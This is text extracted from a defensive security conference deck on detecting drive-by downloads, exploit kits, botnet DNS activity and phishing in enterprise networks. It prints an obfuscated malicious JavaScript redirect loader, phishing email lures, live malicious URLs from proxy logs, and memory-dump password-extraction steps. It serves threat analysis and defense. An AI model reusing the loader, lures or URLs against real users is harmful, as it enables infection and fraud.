Practice ­ if you want To be like us :)
Defending The Enterprise
101 receipes of infosec warfare ;)
The Russian Way
Vladimir Kropotov Sergey Soldatov Fyodor Yarochkin

About the speakers

 Prepare  Detect  Protect

 Investigate

Overview
 Understand threats  Real time visibility  You owned. Your
actions?  Owned: finding who
targets you, what data they want. What's been compromised

We discuss these techniques in hands-on matter

Breaking down details
 Threats: experience from Soviet Union
­ Primary threats ­ Secondary threats
 Defenses
­ Proactive defenses ­ Dealing with primary threats ­ Living with presence of secondary threats ­ Systematic Framework (tools)

Tools used in this presentation
git clone https://github.com/fygrave/ndf.git

Threats

Understanding threats
 Attack actors  Financially motivated criminals (See our "from Russia with Love.exe talks")  Espionage ­ industrial and political
 Attack vectors  Web remains to be the most common way of having your network compromised  Email is the other common channel

Drive-By step by step
[ examples, drive by campaigns, compromises, malware behavior ]
In Russia you can owned via drive-by way more often than anywhere else :) ­ fact of life

Infection via http (hospital_mid_driveby.pcap)
[ examples go here, drive by campaigns, comprmises, behavior of mal ]

As it can be seen in proxy logs
GET http://echtvfn.ftp1.biz/counter HTTP/1.1 Referer: http://www.medcenter-mid.ru/ Content-Type: text/html; charset=utf-8
GET http://echtvfn.ftp1.biz/eStOzPU/qxrupMvs1Cl2? vxetuy=EmgmE9xgqzzXmmgzmgmxxB
Referer: http://echtvfn.ftp1.biz/counter Content-Type: application/javascript GET http://echtvfn.ftp1.biz/tStOzPU/qxrupMvs1Cl2 HTTP/1.1 User-Agent: Mozilla/4.0 (Windows XP 5.1) Java/1.6.0_30 Content-Type: application/java-archive GET http://echtvfn.ftp1.biz/d4StOzPU/qxrupMvs1Cl2 HTTP/1.1 User-Agent: Mozilla/4.0 (Windows XP 5.1) Java/1.6.0_30 Content-Length: 75776 Content-Type: application/octet-stream

Drive-By in Nutshell :)
 Visit an infected site (any banner network can be a lead too)
 Traffic distribution/TDS (not compulsory)  Target Identification (javascript exploit selection)  Exploit  Payload (.exe)  Statistics update

Secondary threats
Your network is compromised.. what's next...?
 The data gets siphoned out of your network
 Monitoring by adversary  Victimized network users

Secondary threats
 Methods ­ Communication channels  Hidden communication (covert
channels)  Actors and Actor targets ­ spies want
your data :) So what do we look at here? :)

Post infection activity (Shiz example)

Post infection activity (Shiz example)

Post infection activity (Shiz example)

Post infection activity (Shiz example)

RRD is coooool! :)

 Assumption: anyone who periodically 'calls' back is a bad guy (make exceptions)

 RRD is your friend.
Look at anomalies: packet sizes, frequencies, port ranges

DNS are interesting too
 DNS traffic is very intersting to look at

Spot some friends.. :)
If you were paying attention you could spot some friends:
- malware activity (shiz, carbep, etc) - antivirtuses using DNS as a very convinient
covert channel - Other botnets

Find malware.. easy. Look for weird domains:
"0-0-0-0-1-0-0-1-1-0-0-0-1-0-0-1-0-1-1-0-0-1-1-1-1-1-1-1-1-1-1-.0-0-0-0-0-0-0-0-00-0-0-0-7-0-0-0-0-0-0-0-0-0-0-0-0-0.info  96.126.108.132:" "0-0-1-0-1-1-1-0-0-1-1-1-1-1-0-1-1-1-0-1-1-0-1-0-1-1-1-1-1-1-1-.0-0-0-0-0-0-0-0-00-0-0-0-38-0-0-0-0-0-0-0-0-0-0-0-0-0.info  96.126.108.132"
"0-0-1-0-0-0-1-0-1-0-0-1-0-0-1-0-0-0-0-1-1-0-0-0-1-1-1-1-1-1-1-.0-0-0-0-0-0-0-0-00-0-0-0-28-0-0-0-0-0-0-0-0-0-0-0-0-0.info  96.126.108.132" .. and seek for cross-ref: 96.126.108.132  "zeqsmmiwj3d.com" "tufecagemyl.eu" "tep.xylocomod.com" "ryleryqacic.eu" "pufiluqudic.eu" "alotibi.xylocomod.com"...

So lets spot some friends..
"foxivusozuc.eu:eu_14_3.0_NXX:66.175.210. 173:0" "vopycyfutoc.eu:eu_14_3.0_NXX:_:3" "qegovyqaxuk.eu:eu_14_3.0_NXX:_:3" ...
around 700 domains total

Bot.. at linode
Among those: "cihunemyror.eu:eu_14_3.0_NXX:66.175.210.173:0" "jecijyjudew.eu:eu_14_3.0_NXX:66.175.210.173:0" "voworemoziv.eu:eu_14_3.0_NXX:66.175.210.173:0" "xuqohyxeqak.eu:eu_14_3.0_NXX:66.175.210.173:0" "gadufiwabim.eu:eu_14_3.0_NXX:66.175.210.173:0" "lyruxyxaxaw.eu:eu_14_3.0_NXX:66.175.210.173:0" "l33t.brand-clothes.net:net_22_4.0_NPX:66.175.210.173:0" "wanttobehappy.in:in_16_4.0_NXX:66.175.210.173:0" "ryqecolijet.eu:eu_14_3.0_NXX:66.175.210.173:0" "fokyxazolar.eu:eu_14_4.0_NXX:66.175.210.173:0" "mamixikusah.eu:eu_14_3.0_NXX:66.175.210.173:0" "foxivusozuc.eu:eu_14_3.0_NXX:66.175.210.173:0" "jefapexytar.eu:eu_14_3.0_NXX:66.175.210.173:0"

Bots and botnets

BTW, another bot, carbep is over.. maybe :)

Secondary threats Risks
 Data leaks  Reputation  Incident Public
Disclosure  Service outage

More on covert channels..
Interesting way of 'channeling' control of your machines through publicly accessible portals, such as twitter, facebook, plurk..

Malware orchestration
 Initially spotted by Joe Steward from Secureworks
http://www.secureworks.com/cyber-threat-intelligence/threats/chasing_apt/

Updates posted in form of "Serial Number: XXXXX  encoded C2 information

Timing of botnet operator posting "updates" on plurk:

2011-07-27 01:57:30 GMT 114.37.27.26
2011-08-03 07:53:27 GMT 122.116.200.234 2011-08-08 00:54:00 GMT 122.116.200.234
2011-08-10 14:03:30 GMT 122.116.200.234 2011-08-30 00:41:11 GMT 69.160.243.116
2011-08-31 03:31:30 GMT 122.117.204.210
2011-09-28 07:54:03 GMT 122.117.204.210 2011-09-30 00:38:42 GMT 122.117.204.210
2011-10-11 01:40:55 GMT 122.117.204.210 2011-10-20 02:43:06 GMT 122.117.204.210
2011-11-16 14:00:43 GMT 220.130.59.159 2011-11-28 06:44:54 GMT 220.130.59.159
2011-11-28 09:55:03 GMT 220.130.59.159 2011-11-30 01:05:46 GMT 220.130.59.159

2011-12-28 02:28:09 GMT 203.198.145.45 2011-12-29 07:52:32 GMT 203.198.142.147
2012-01-29 03:06:19 GMT 203.198.145.45 2012-02-27 07:51:50 GMT 203.198.145.45
2012-03-21 07:01:40 GMT 220.130.59.159 2012-04-17 02:34:24 GMT 220.130.59.159
2012-05-02 03:04:28 GMT 203.198.145.45
2012-05-18 07:45:34 GMT 220.130.59.159 2012-06-14 09:04:41 GMT 203.198.145.45
2012-06-20 02:47:46 GMT 203.198.145.45 2012-06-28 01:48:24 GMT 203.198.145.45
2012-07-09 04:25:35 GMT 203.198.145.45

Interesting observations
 User agent used to access 'control' accounts is always: 'User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1).
 While generic, exactly the same UA was seen in some Application level DDoS attacks against gambling websites in Taiwan.

Another bot
 Similar activities are seen often:

Tageted and not targeted attacks consequences examples 2012-2013
 Obvious monetization after targeted attack is easily detectable. Examlpe, sites with huge traffic.
 targeted impact of not targeted attacks (high profile news resources, confirmed incidents, "afterbot" consequences)
 Why do we have "Incident out of the company scope" in our internal classification

Prepare

Systematic Defense

 What to look at
 How to look at your data
 How to prepare well for an attack (you can't walk into the same river twice, so 'preserve' the flow)

Rinse and repeat ;-)

PREPARE
Preparatory actions should be taken to provide data sources and tools for detection

DETECT
Ideally, be able to detect attack in progress (minimal impact), however we wish to be able to
detect attacks at some point of time.

INVESTIGATE
Identify the impact of the attack so proper response could be implemented

PROTECT
 Real-time attack detection: the attacked or compromised machines are to be isolated from the rest of the network (minimize impact)
 Post-incident detection ­ identify impacted systems and mitigate the impact

Detect

Entry points into enterprise
WEB SMTP Mobile (BYOD) Flash/disks Misc (usb, ethernet ports on your walls, your trash ;-))

Detection techniques
 Focus on your entry points first. But monitor for signs of secondary activities
 Log analysis  Traffic analysis using custom tools  DNS traffic analysis  Honeypot data analysis

Antiviruses and modern malware
 It's not so effective as 5 years ago for realtime malware detection.
 Antiviruses and attack surface

Antiviruses and modern malware
 It's not so effective as 5 years ago for realtime malware detection.
 Antiviruses and attack surface
 The same true for IPS/IDS (unfrtntly)

Box solutions as Simple FUI (Fuck up indicators)
 Antivirus == damn good Fuck Up indicator of your daily monitoring work. If you see ex. CVE-2012-0158 the e-mail, received 1 year ago - you see you fucked it up a year ago, but now must be able to react. :)
25.10.2012 18:01 Test_host01 Exploit-CVE2012-0158.f!rtf Undetermined clean error, deleted successfully C:\Documents and Settings\User02\Desktop\2read\Modern energy in
China.msg\68.OLE 25.10.2012 18:01 Test_host01 Exploit-CVE2012-0158.f!rtf Undetermined clean error, deleted successfully C:\Documents and Settings\User02\Desktop\2read\US
energy.msg\68.OLE

Vendor FP

Vendor FP

Vendor FP

Vendor FP

Educating USERS Vendors...
Based on our investigation, "Worm.Win32.Vobfus.djek " was detected as False Positive and resolved on 3 April. Therefore, after antivirus DB update, the issue should be resolved.
Regarding the remain issues, we have found them to be False Positive incidents and decided to take the following steps:
Trojan.Win32.Master.A ­ will be removed from our DB 03.04.2013 Backdoor.Win32.Zlob.B ­ will be removed from our DB 03.04.2013 Worm.Win32.Dasher.J ­ will be lowered to low confidence level Trojan.Win32.Biscuit.A ­ was already fixed last week

And finally Vendor got something

Government certified solutions...
 In full compliance with all mandatory requirements
 Without "undeclared capabilities"  With good crypto  ... etc...

Government certified solutions...
 In full compliance with all mandatory requirements
 Without "undeclared capabilities"  With good crypto  ... etc...
....all this means nothing for security!

Certified solution story
 What is it for?
- to make secure (certified) communication
 What is the problem?
- just store password in memory ... in clear

How does 'attack' work?
1. Start the application "Business mail"
2. Find PID of Wmail.exe
3. Dump process' memory to file
4. Find your password in dump file

How does 'attack' work?
(that wasn't the end)
5. Exit "Business mail" (you can check that no process)
6. Continue to work as usual
3. Some hours later use Windows memory reader to dump whole comp memory (need admin rights)
4. Again, find your password in dump (use strings)!

How does 'attack' work?
(that wasn't the end)
5. Exit "Business mail" (you can check that no process)
6. Continue to work as usual
3. Some hours later use Windows memory reader to dump whole comp memory (need admin rights)
4. Again, find your password in dump (use strings)!

How does 'attack' work?
(that wasn't the end)
5. Exit "Business mail" (you can check that no process)
6. Continue to work as usual
3. Some hours later use Windows memory reader to dump whole comp memory (need admin rights)
4. Again, find your password in dump (use strings)!

What does it mean?
1. "Certified" is not the same as "Secure":  Mentioned criteria is not enough
The year of 1992 (actually, it's Orange book)
 Event mentioned criteria tested badly
In demonstrated case we have mandatory requirement but it wasn't implemented
 The more users use the product the more secure it
That's not about Russian gov certified products

What does it mean?
1. "Certified" is not the same as "Secure":  Mentioned criteria is not enough
The year of 1992 (actually, it's Orange book)
 Event mentioned criteria tested badly
In demonstrated case we have mandatory requirement but it wasn't implemented
 The more users use the product the more secure it
That's not about Russian gov certified products :-((

What does it mean?
1. "Certified" is not the same as "Secure":  Mentioned criteria is not enough
The year of 1992 (actually, it's Orange book)
 Event mentioned criteria tested badly
In demonstrated case we have mandatory requirement but it wasn't implemented
 The more users use the product the more secure it
That's not about Russian gov certified products :-((

Cloud technologies from Security Vendors and Confidential information
 Cloud, tell me - is this a malicious file?
 Mmm, not sure, may be not...
 Thank you for sending us your annual financial report...

DNS.. antiviruses are noisy :)
 Dr. Web "covert channel" - building a passive DNS:

DNS antiviruses are noisy
 Trendmicro.. what are we doing here?:)

DNS .. antiviruses .. hmm
.McAfee....

Detecting and mitigating threats, our way
 The most important thing is environment:
- Real Environment
- Attacker Desirable Environment
- Defender Desirable Environment.
 Security is also: availability and usability

Enterprise environment:
 Environment must be strictly controlled as possible. "SOE" is a good practice :)
 Environment can be easy switchable and detachable.
 Traffic between internal and external network must be predictable. Hello skype....

Attacker and your Environment = Cat & Mouse game
 Honeypot Environment must look real to the attacker
 Honeypot Environment must be able to provide evidence
 Real Environment must be isolated from Honeypots.
 Compromised Environment must be segregated as soon as possible if attack was successful (containment)

Detecting and mitigating threats: Prerequisites
Reality of life in a distributed network:  You can't control your network  Different tools/people are used in different regions  Lots of data

Detecting and mitigating Primary and Secondary threats
Things to pay attention in your logs:  suspicious user agents,  content-type,  suspicious application type (i.e. octed-stream),  obfuscated IP addresses ( 0x55..., int32
encoded IP addresses

"Intelligent" log processor (proc_log_*.pl)

"Intelligent" log processor (proc_log_*.pl)
· If you don't have SIEM....
· If you don't use even SEC.pl or other on-line log processor...
· If you have nothing ... just desire to understand what's going on....

"Intelligent" log processor (proc_log_*.pl)
· If you don't have SIEM.... · If you don't use even SEC.pl or other on-line log processor... · If you have nothing ... just desire to understand what's going on....
This script will help you to find evil in your net

How does it work?
1. Take predefined patterns for log fields and calculate log line score. Depending on score write down line into colored (EB,B,W,EW,Gr) list for further investigation
(--list) 2. Find all lines with field matched specified pattern ­ smth. like egrep+cut\awk
(--match)

General course of work (list search)

General course of work (match search)

The scenario
1. --list ==> Scored rows with signatures ==> Users in troubles
2. --match ==> Find all history about users in troubles ­ before and after signature ==> Further manual investigation
3. Update signatures if need to

Detecting SMTP vector activities
 Email is another common method for an adversary to put a foot into the target network.
 Attractiveness:
 Low profile (you only send emails to those who you want to comromise)
 Easy antivirus bypass (password-packed zip archives anywone?)
 Users are generally ­ idiots ;-)

Owning a network..

 Vulnerabilities seen in use through this attack

vector:

Adobe Acrobat reader CVE-2013-0640 CVE-2012-0775
Adobe flash player

MS Office
CVE-2012-0158 CVE-2011-1269 CVE-2010-3333
CVE-2009-3129

CVE-20121535

Java CVE-2013-0422

CVE-2012-1723

CVE-2012-5076

But...
 Human stupidity is exploited more than ever..

«malicious message»
From:RapidFAX.Notifications [mailto:reports@rapidfax.com] Subject: RapidFAX: New Fax
A fax has been received. MCFID = 39579806 Time Received = Tue, 04 Dec 2012 21:48:21 +0200 Fax Number = 9470091738 ANI = 3145495221 Number of Pages = 18 CSID = 32231126269 Fax Status Code = Successful Please do not reply to this email. RapidFAX Customer Service www.rapidfax.com

Content of archive file
Simple executable (no vulnerabilities exploited)
  

Variant #2: email contains an HTML file with redirect to 'malicious' page
Specifics
· An HTML with a simple page redirect
· Passes Antivirus checks, since does not contain malicious payload
· Allows to bypass corporate proxy server checks, which disable script/iframe redirects.
· Content of the message makes it attractive for the user to view the HTML content.

Another Email example
Subject: British Airways E-ticket receipts
e-ticket receipt Booking reference: 05V9363845 Dear,
Thank you for booking with British Airways.
Ticket Type: e-ticket This is your e-ticket receipt. Your ticket is held in our systems, you will not receive a paper ticket for your booking.
Your itinerary is attached (Internet Exlplorer/Mozilla Firefox file)
Yours sincerely,
British Airways Customer Services
British Airways may monitor email traffic data and also the content of emails, where permitted by law, for the purposes of security and staff training and in order to prevent or detect unauthorised use of the British Airways email system.
British Airways Plc is a public limited company registered in England and Wales. Registered number: 89510471. Registered office: Waterside, PO Box 365, Harmondsworth, West Drayton, Middlesex, England, UB7 0GB.
How to contact us Although we are unable to respond to individual replies to this email we have a comprehensive section that may help you if you have a question about your booking or travelling with British Airways.
If you require further assistance you may contact us
If you have received this email in error This is a confidential email intended only for the British Airways Customer appearing as the addressee. If you are not the intended recipient please delete this email and inform the snder as soon as possible. Please note that any copying, distribution or other action taken or omitted to be taken in reliance upon it is prohibited and may be unlawful.

Actual redirect
<body> <h1><b>Please wait. You will be forwarded.. . </h1></b> <h4>Internet Explorer / Mozilla Firefox compatible only</h4><br>
<script>ff=String;fff="fromCharCode";ff=ff[fff];zz=3;try{document.body&=5151}catch(gdsgd) {v="val";if(document)try{document.body=12;}catch(gdsgsdg){asd=0;try{}catch(q){asd=1;}if(!asd) {w={a:window}.a;vv="e"+v;}}e=w[vv];if(1){f=new Array(118,96,112,49,60,50,57,58,8,118,96,112,50,60,116,97,113,47,59,9,103,102,39,116,97,113,47,61,60, 116,97,113,48,41,31,121,100,110,97,117,108,99,110,115,44,108,110,97,97,115,103,111,109,59,34,103,11 4,116,111,56,47,46,100,111,113,115,109,44,106,97,45,112,117,57,54,48,55,46,47,101,109,114,116,107,4 7,107,103,110,106,113,47,98,109,108,116,107,110,45,110,104,111,32,59,124);}w=f;s=[];if(window.docum ent)for(i=2-2;-i+104!=0;i+=1){j=i;if((031==0x19))if(e)s=s+ff(w[j]+j%zz);}xz=e;if(v)xz(s)}</script> </body> </html>

Another variation: email that contains masked links to malicious pages
· No attachment. The message text is html/text points to the same resource
· All links are 'masked' to be pointing to legit links
· The same attreactive text of the message

Hot topic for big company, Cyprus Crisis
Diana Ayala saw this story on the BBC News website and thought you should see it.
** Cyprus bailout: bank levy passed parliament already! ** Cyprus can amend terms to a bailout deal that has sparked huge public anger.... < http://www.bbc.com.us/go/em/news/world-cyprus-57502820>
** BBC Daily E-mail ** Choose the news and sport headlines you want - when you want them, all in one daily e-mail < http://www.bbc.co.uk/email>
** Disclaimer ** The BBC is not responsible for the content of this e-mail, and anything written in this e-mail does not necessarily reflect the BBC's views or opinions. Please note that neither the e-mail address nor name of the sender have been verified.
If you do not wish to receive such e-mails in the future or want to know more about the BBC's Email a Friend service, please read our frequently asked questions by clicking here

This message is to notify you that your package has been processed and is on schedule for delivery from ADP.
Here are the details of your delivery: Package Type: QTR/YE Reporting Courier: UPS Ground Estimated Time of Arrival: Tusesday, 5:00pm Tracking Number (if one is available for this package): 1Z023R961390411904
Details: Click here to view and/or modify order
We will notify you via email if the status of your delivery changes.
--------------------------------------------------------------------------------
Access these and other valuable tools at support.ADP.com: o Payroll and Tax Calculators o Order Payroll Supplies, Blank Checks, and more o Submit requests online such as SUI Rate Changes, Schedule Changes, and more o Download Product Documentation, Manuals, and Forms o Download Software Patches and Updates o Access Knowledge Solutions / Frequently Asked Questions o Watch Animated Tours with Guided Input Instructions
Thank You, ADP Client Services support.ADP.com
--------------------------------------------------------------------------------
This message and any attachments are intended only for the use of the addressee and may contain information that is privileged and confidential. If the reader of the message is not the intended recipient or an authorized representative of the intended recipient, you are hereby notified that any dissemination of this communication is strictly prohibited. If you have received this communication in error, notify the sender immediately by return email and delete the message and any attachments from your system.

What happens if you click..

Exploit Packs - Detection -

Detecting exploit packs: approaches
 How: By typical chains in your logs  Look for more than one attack vector from the same
resource as an indicator  By typical file names: for example inseo.pdf  By typical URLS  Exploit snippets :net.class, gmail.class, and so on  Looking for generic exploit components inside payload  Picking up suspicious user agents and application type
(octed-stream, java agent)

Typical chains of exploit packs

URL (Blackhole 2, Mar 2013) 65.75.144.207/9f5090afabfb40cdd70a5e63064b21a7/q.php

Application type
text/html; charset=UTF-8

65.75.144.207/9f5090afabfb40cdd70a5e63064b21a7/q.php? Application/

nemrbz=psbg&sipgik=nupatq

java-archive

65.75.144.207/9f5090afabfb40cdd70a5e63064b21a7/9f5090af Application/

abfb40cdd70a5e63064b21a7/q.php?

x-msdownload

jf=1k:1i:1k:2v:1o&ie=1g:1n:32:33:1n:1n:1n:2v:31:1o&b=1f&

sd=p&wy=h&jopa=4656855

Longer chain (??sploit pack, Sep 2012)

http://serzscd.servebbs.net/go.php? id=5105&ip=91.227.184.11&session=474a143d42371858e95d&br=ie http://serzscd.servebbs.net/start.php? id=5105&session=474a143d42371858e95d&ip=91.227.184.11 http://serzscd.servebbs.net/counter.swf
http://serzscd.servebbs.net/apolo.php
http://kkmahrfl.begin-dog-iwxtumncfy.org/4ff83063f08d249725000001/4ff883f5ef373e8042000005/ http://kkmahrfl.begin-dog-iwxtumncfy.org/4ff83063f08d249725000001/4ff883f5ef373e8042000005/505c53b5a74 765547400526bGnullG9,2,0,0 http://kkmahrfl.begin-dog-iwxtumncfy.org/4ff83063f08d249725000001/4ff883f5ef373e8042000005/505c53b7a74 76554740052a3/30491834/iAAnseo.pdf http://kkmahrfl.begin-dog-iwxtumncfy.org/4ff83063f08d249725000001/4ff883f5ef373e8042000005/505c53b7a74 76554740052a3/3760908/1712153 http://kkmahrfl.begin-dog-iwxtumncfy.org/4ff83063f08d249725000001/4ff883f5ef373e8042000005/505c53b7a74 76554740052a3/3760908/1712153&f=1

text/html; charset=UTF-8 text/html; charset=UTF-8 application/xshockwave-flash text/html; charset=UTF-8 text/html; charset=utf-8 text/html; charset=utf-8
application/pdf
application/oct et-stream
text/html (loaded successefully)

More than one attack vector from

the same resource as an indicator 1/31/2013 http://129.121.101.49/ff675d4b242669de697f6 text/html 11:53 a1a7428d191/q.php

1/31/2013 http://129.121.101.49/ff675d4b242669de697f6 application/pdf 11:53 a1a7428d191/q.php? bmkfbw=1k:1i:1k:2v:1o&exirrv=3d&rkfajmn=1g :1n:32:33:1n:1n:1n:2v:31:1o&cesnio=1n:1d:1g: 1d:1h:1d:1f
1/31/2013 http://129.121.101.49/ff675d4b242669de697f6 application/java-archive 11:53 a1a7428d191/q.php?rhihgaw=ibfhs&apu=dycb

1/31/2013 http://129.121.101.49/ff675d4b242669de697f6
11:53 a1a7428d191/ff675d4b242669de697f6a1a742 8d191/q.php?
jf=1k:1i:1k:2v:1o&ye=1g:1n:32:33:1n:1n:1n:2v: 31:1o&e=1f&um=b&va=b

application/x-msdownload

1/31/2013 http://129.121.101.49/ff675d4b242669de697f6 11:53 a1a7428d191/ff675d4b242669de697f6a1a742
8d191/q.php? ynyxykhm=1k:1i:1k:2v:1o&kzez=1g:1n:32:33:1
n:1n:1n:2v:31:1o&ojplot=1i&kyibn=tbv&unqz= mcgwp

application/x-msdownload

Does anyone know mentioned case??
2012-12-24 08:39 hxxp://108.165.25.119/34865412a4128d4f1ebaf9ad8f2ac412/q.php 14.01.2013 9:56 hxxp://129.121.88.108/b3aa76a54b00fd803337aab97a0c09e9/q.php 12.02.2013 10:35 hxxp://149.47.142.193/d0c1614e79a22e16cc1404ba3420f469/q.php Mar 19, landing from hxxp://www.hotelduchampdemars.com/ 19.03.2013 16:09 hxxp://129.121.128.249/30cdfca10f74f5b3da51700ba9e135e2/q.php

* Source http://arstechnica.com/security/2013/04/exclusive-ongoing-malware-attacktargeting-apache-hijacks-20000-sites/?utm_medium=twitter&utm_source=dlvr.it

Gimme some fresh exploit

1/14/2013 18:57
1/14/2013 18:57
1/14/2013 18:57

178.238.141.19 http://machete0-yhis.me/ pictures/demos/OAggq

application/x-javaarchive

178.238.141.19 http://machete0-

application/x-java-

yhis.me/pictures/demos/OAggq archive

178.238.141.19

http://loretaa0-
shot.co/careers.php? cert=561&usage=392&watch=4
&proxy=49&ipod=171&shim=34 4&pets=433&icons=252&staff=6
21&refer=345

application/octetstream

And AV vendor says...
23.01.13 19:56 Detected: Trojan-Spy.Win32.Zbot.aymr C:/Documents and Settings/user1/Application Data/ Sun/Java/Deployment/cache/6.0/27/4169865b-641d53c9/UPX
23.01.13 19:56 Detected: Trojan-Downloader.Java.OpenConnection.ck C:/Documents and Settings/user1/Application Data/ Sun/Java/Deployment/cache/6.0/48/38388f30-4a676b87/bpac/b.class
23.01.13 19:56 Detected: Trojan-Downloader.Java.OpenConnection.cs C:/Documents and Settings/user1/Application Data/Sun/Java/Deployment/cache/6.0/48/38388f30-4a676b87/ot/pizdi.class
23.01.13 19:58 Detected: HEUR:Exploit.Java.CVE-2013-0422.gen
C:/Documents and Settings/user1/Local Settings/ Temp/jar_cache3538799837370652468.tmp

TDS and EP Redundancy & Adaptation

11.03.2 013 11:28 11.03.2 013 11:28

hxxp://cliga.ru/jwplayer2/med. php hxxp://gankas.tk/foto.cgi?3

146.185.255.66 146.185.255.66

11.03.2 hxxp://gankas.tk/meto.cgi?2 013 11:28

146.185.255.66

11.03.2 013 11:29

hxxp://gankas.tk/fqmg.cgi? 3&pfvqt=1&fhjxm=1&orxgz=3 212185938&ur=1&hxxp_REF ERER=hxxp%3A%2F %2Fcliga.ru %2Fjwplayer2%2Fmed.php

37.139.51.123

80 hxxp://gankas.tk/meto.cgi?2
80 hxxp://gankas.tk/fqmg.cgi? 3&pfvqt=1&fhjxm=1&orxgz=3212185938& ur=1&hxxp_REFERER=hxxp%3A%2F %2Fcliga.ru%2Fjwplayer2%2Fmed.php
80 hxxp://gankas.tk/xgvihoiz.cgi? 2&pfvqt=1&fhjxm=1&orxgz=3212185938& ur=1&hxxp_REFERER=hxxp%3A%2F %2Fcliga.ru%2Fjwplayer2%2Fmed.php
80 hxxp://oaandpcy.whose.planzgdrtillfts.biz/recipe-ayatollah_aliases.htm

11.03.2 013 11:29

hxxp://gankas.tk/xgvihoiz.cgi ? 2&pfvqt=1&fhjxm=1&orxgz=3 212185938&ur=1&hxxp_REF ERER=hxxp%3A%2F %2Fcliga.ru %2Fjwplayer2%2Fmed.php

5.135.28.208

90 hxxp://careliquor.biz:90/forum/animal.php

Typical filenames

2012-08-03 11:27:54.097

hxxp://lctputevnvme.from-sortrgt-bcrvvsml.org/4ff83063f08d249725000001/4ff883f5ef373e8042000005/501b7d0d4f340eaa33012c70/30491834/ inseo.pdf

8/7/2012 14:52
9/10/201122 17:01
10
9/10/2012 17:26
8

hxxp://upydnyxhs.black-footballyfyxvlizvs.org/4ffa973cf08d249725000003/4ffabc51ebf5ff0c52000013/5020f2e6404b9b443600f5ad/1495394/ jingo.jar
hxxp://shwohtwk.stringgenerationbeflyzgzvm.org/50178a97454999b179000005/50178c932ef2195604000030/504de476b00c1a27790f093c/304918 34/ iAAnseo.pdf
hxxp://sklnigvfh.money-middle-orm-uknaxbgb.org/4ffd323cf08d249725000004/5019600d2ef2195604000057/504dea26b00c1a27790f4a71/258303 92/ jAAingo.jar

9/24/2012 18:01 6
9/25/2012 14:02 4

hpxyxhpu:./o/qrgk/z4offgav9e7b3qcpf0q8cd.b2la4c9k7-2fo5o0t0b0a0ll0CClcoo3ulluu/q4mm-fnnfsa12lebsc-21ebf5ff0c52000012/506067b345db2b8602036136/48492345/

dAAocum.pdf

Column 3

hxxp://inthxbxorib.orange-ansi-fclx-aygynakx.org/4ffa973cf08d249725000003/4ffabec1ebf5ff0c52000015/5061814945db2b86021a966b/1495394/ jAA2ingo.jar

10/16/20122 10:23
10/17/20102 13:18

hxxp://rqbakkbkwtgtkws.shorts-vipiqmc-awgcvnm.org/4ff83063f08d249725000001/4ff883f5ef373e8042000005/507cfd7a31fdb54c3c034529/30491834/ iAAnseo.pdf
Rowhc1zxfx.po:r/gR/z/o4zwfsf28rn3c0u6s3Rsofr0w.n83odt2e4p9aR7do2w-5li4n0e0s0l0e0y1f-/g4lfpf8- 83f5ef373e8042000005/507e780831fdb54c3c7c24a1/1495394/ jAA2ingo.jar

10/17/2012 17:34

hxxp://scared-regimecemetery.dzzmyopixpneyefekqctkdyerlxanalysesrziy.org/507eb3a9c05d80204800030d/30491834/ onsero.pdf

2012-10-30 14:40:49.077

hxxp://xzworphanagesboageszz.snobnqidizchixwtggseolimmortalcquk.org/508fae3a31892c2e7d0ac9bb/30491834/
onsero.pdf

More info about this Campaign
- use of domains with extremely short lifetime (domain blacklisting doesn't work here)
- frequent changes of hosting ip addresses (2 times/day,explicit IP blacklisting doesn't work here)
- different methods of traffic redirection ­ Iframe redirection ­ ad. network simulation ­ SMS paid services (genealogical archives, fake av updates, horoscopes, etc)
- preliminary collection of the target system information (OS/Browser version)


Short-term and disposable domain names
Frequently used domains:
abrmrbzikxltvh.lines-arrayirs-frrccad.org

Randomly generated

Dictionary-based generation

also:

zfkimpacts-mobilized.analoguefsoqcircular-hrgvredeemabletgpl.org

Dictionary based

Dictionary based generation

Other things to notice: - IP addresses are usually located within the same subnet - IP addresses change every 12 hours (incrementally) - subnets change monthly - whois information disappears right after domain disposal (domains on trial)

Affected by this malware campaign:
dominospizza.ru --> qakmwkqdhybpc.give-from-gzi-bgqi-ranb.org
peoples.ru --> sklnigvfh.money-middle-orm-ukna-xbgb.org
f1news.ru --> xdqospocepx.panel-book-tzha-uekydtfm.org
euro-football.ru --> ofbgplmx.manager-vipufpncztf-nezp.org
gotovim.ru --> cstermbktwelnv.cat-email-ceepgm-mfm.org
sroot@thebox:~$ whois cstermbktwelnv.cat-email-ceepgm-mfm.org NOT FOUND

Whois fastflux ;-)
· WHOIS fastflux ... HOW?!

Domain ID:D166393631-LROR

Domain Name:FOOTBALL-SECURITY-

WETRLSGPIEO.ORG

Created On:21-Aug-2012 01:23:52 UTC

Last Updated On:21-Aug-2012 01:23:53 UTC

Expiration Date:21-Aug-2013 01:23:52 UTC

Sponsoring Registrar:Click Registrar, Inc. d/b/a

publicdomainregistry.com (R1935-LROR)

Status:CLIENT TRANSFER PROHIBITED

Status:TRANSFER PROHIBITED

Status:ADDPERIOD

Registrant ID:PP-SP-001

Registrant Name:Domain Admin

Registrant Organization:PrivacyProtect.org

103

Registrant Street1:ID#10760, PO Box 16

Registrant Street2:Note - All Postal Mails Rejected,

visit Privacyprotect.org

Words distribution (len >3) in domain names
104

Examples of affected websites

More examples

Dynamically generated URLs. Old style
Entry request: http://whtgevsmddpiue.socks-information-
zffmagvonv.org/4ffa973cf08d249725000003/50011735362caad364000023/ OS/browser version information (Leaks some information before compromise): http://whtgevsmddpiue.socks-information-
zffmagvonv.org/4ffa973cf08d249725000003/50011735362caad364000023/ 50601014edaf66917d1c47d2G1,6,0,30G10,1,0,0 Exploit execution: http://whtgevsmddpiue.socks-informationzffmagvonv.org/4ffa973cf08d249725000003/50011735362caad364000023/ 50601016edaf66917d1c4831/1495394/jAA2ingo.jar Upon successeful exploitation, payload is fetched: http://whtgevsmddpiue.socks-informationzffmagvonv.org/4ffa973cf08d249725000003/50011735362caad364000023/ 50601016edaf66917d1c4831/1495394/1196140
107

Dynamically generated URLs, "new style"
Initial request: http://ksizxzbabahgdzxhlnu.conservatism-xrplsubmitshebm.org/officiallyracer-
unbelievably.htm OS/browser information fetching and exploit selection: http://ksizxzbabahgdzxhlnu.conservatism-
